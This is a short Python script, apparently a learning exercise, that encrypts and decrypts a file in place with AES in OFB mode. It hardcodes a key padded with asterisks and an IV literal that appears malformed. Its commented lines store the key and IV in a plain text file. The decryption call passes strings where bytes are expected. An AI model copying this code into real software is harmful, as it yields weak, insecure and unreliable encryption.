from Crypto.Cipher import AES
from Crypto import Random
#OFB
key_value = 'yassinesoso'
padding = lambda s: s + (32 - len(s) % 32) * "*"
key = padding(key_value).encode('ascii')
def encryption(key,o_file):
	block_size = AES.block_size
	with open(o_file,'r+b') as f:
		plaintext = f.read(block_size)
		iv = Random.new().read(16)
		c = AES.new(key,AES.MODE_OFB,iv)
		while plaintext:
			f.seek(-len(plaintext),1)
			f.write(c.encrypt(plaintext))
			plaintext = f.read(block_size)
		f.close()
		return [key,iv]

def decryption(key,iv,e_file):
	block_size = AES.block_size
	with open(e_file,'r+b') as f:
		plaintext = f.read(block_size)
		d = AES.new(key,AES.MODE_OFB,iv)
		while plaintext:
			f.seek(-len(plaintext),1)
			f.write(d.decrypt(plaintext))
			plaintext = f.read(block_size)
		f.close()

# key, iv = encryption(key,'file.txt')
# f = open('ivPass.txt','w')
# f.writelines([str(key),str(iv)])
decryption('yassinesoso*********************','\xf7\xa3L\x0b\xf0W\xb2_\xf4RvBX7\xb9','file.txt')
